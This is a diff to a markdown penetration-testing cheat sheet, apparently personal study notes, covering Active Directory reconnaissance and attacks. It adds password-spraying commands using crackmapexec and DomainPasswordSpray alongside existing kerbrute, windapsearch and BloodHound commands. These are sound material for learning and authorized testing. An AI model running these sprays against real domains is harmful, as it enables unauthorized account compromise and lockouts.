@@ -1,4 +1,4 @@
-### Scanning, Enumeration, Recon, External
+## Scanning, Enumeration, Recon, External
 
 Scan for live hosts on network
 ```
@@ -15,6 +15,17 @@ kerbrute userenum -d <domain.local> --dc <domain.ip.number> <usernametextfile-to
 Kerbrute can be used to password spray
 ```
 /kerbrute_linux_amd64 passwordspray -d <lab.ropnop.com> <domain_users.txt> <Password123>
+```
+
+Password spray with Crackmapexec
+```
+crackmapexec smb <domain.ip> -u <user.list> -p <Password-to-try> //use --local-auth hen trying a local admin account
+```
+
+Windows domain spray internally - https://github.com/dafthack/DomainPasswordSpray
+```
+import-module domainpasswordspray.ps1
+invoke-DomainPasswordSpray -password <password-to-try> -outfile <output.file> -errorAction silentlycontinue
 ```
 
 Link for Kerbrute - https://github.com/ropnop/kerbrute
@@ -65,11 +76,11 @@ python3 windapsearch.py --dc-ip <172.16.5.5> -u <username>@<domainname.local> -p
 
 ```
 
-### Initial Access
+## Initial Access
 
 Enumerate users and spray passwords. Look for creds.
 
-### Internal enumeration - Services, Accounts, Security Controls
+## Internal enumeration - Services, Accounts, Security Controls
 
 Credentialed enumeration - We're interested in information about domain user and computer attributes, group membership, Group Policy Objects, permissions, ACLs, trusts, and more.
 
@@ -100,3 +111,5 @@ sudo bloodhound-python -u <'username'> -p <'password'> -ns <172.16.5.5> -d <doma
 sudo neo4j start
 bloodhound
 ```
+
+
